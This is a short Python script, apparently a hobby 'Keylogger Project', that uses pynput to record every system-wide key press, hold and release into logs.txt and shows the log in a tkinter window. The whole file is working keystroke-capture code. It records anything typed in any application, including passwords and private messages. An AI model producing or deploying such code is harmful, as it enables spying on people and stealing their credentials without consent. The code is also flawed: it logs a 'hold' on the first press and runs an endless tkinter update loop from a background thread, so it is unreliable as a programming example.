from tkinter import Tk, Text, Scrollbar, Toplevel
import threading
from pynput import keyboard

root = Tk()
root.geometry("150x200")
root.title("Keylogger Project")

key_list = []
x = False
key_strokes = ""

def update_txt_file(key_list):
    with open('logs.txt', 'w+') as key_log:
        for item in key_list:
            for key, value in item.items():
                key_log.write(f"{key}: {value}\n")

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'hold': f'{key}'})
    update_txt_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'released': f'{key}'})
    if x == True:
        x = False
        update_txt_file(key_list)

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def run_keylogger():
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

def open_gui():
    window = Toplevel()
    window.title("Keylogger GUI")

    text = Text(window)
    text.pack(fill="both", expand=True)

    scrollbar = Scrollbar(window)
    scrollbar.pack(side="right", fill="y")

    text.config(yscrollcommand=scrollbar.set)
    scrollbar.config(command=text.yview)

    def update_logs():
        while True:
            text.delete(1.0, "end")
            with open('logs.txt', 'r') as key_log:
                text.insert("end", key_log.read())
            window.update()
    
    logs_thread = threading.Thread(target=update_logs)
    logs_thread.start()

# Start the keylogger
run_keylogger()

# Start the GUI
open_gui()

root.mainloop()
